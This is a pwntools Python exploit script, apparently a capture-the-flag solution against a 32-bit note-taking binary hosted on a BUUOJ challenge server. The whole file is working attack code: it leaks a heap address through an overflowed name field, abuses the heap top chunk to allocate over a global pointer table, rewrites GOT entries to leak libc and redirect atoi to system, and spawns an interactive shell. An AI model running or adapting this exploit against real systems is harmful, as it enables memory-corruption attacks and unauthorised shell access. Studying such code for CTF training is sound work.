from pwn import*
context.log_level ='DEBUG'
def welc():
	p.sendafter('name:','U'*0x3C + 'FMYY')
	p.recvuntil('FMYY')
	heap_base = u32(p.recvuntil('!',drop=True).ljust(4,'\x00'))
	p.sendafter('Org:','\xFF'*0x40)
	p.sendafter('Host:','\xFF'*0x40)
	return heap_base
def new(size,content):
	p.sendlineafter('option--->>','1')
	p.sendlineafter('Input the length of the note content:\n',str(size))
	p.sendlineafter('Input the content:\n',content)
def edit(idx,content):
	p.sendlineafter('option--->>','3')
	p.sendlineafter('id:',str(idx))
	p.sendlineafter('content:',content)
def free(idx):
	p.sendlineafter('option--->>','4')
	p.sendlineafter('id:',str(idx))
p = process('./main')
elf = ELF('./main')
libc =ELF('./libc-2.23.so',checksec=False)
p = remote('node3.buuoj.cn',27268)
heap_base = welc() - 8
log.info('HAEP:\t' + hex(heap_base))
top_chunk = heap_base + 0x48*3 + 8
target = 0x804B120 - 0x80 - top_chunk - 8
new(target,'FMYY')
new(0x78,p32(0x200)*8)
new(0x200,p32(elf.got['atoi']) + p32(elf.got['free']) + p32(elf.got['atoi']))
edit(1,p32(elf.plt['puts']))
free(0)
libc_base = u32(p.recvuntil('\xF7')[-4:]) - libc.sym['atoi']
system = libc_base + libc.sym['system']
edit(2,p32(system))
p.sendafter('option--->>','/bin/sh\x00')
p.interactive()
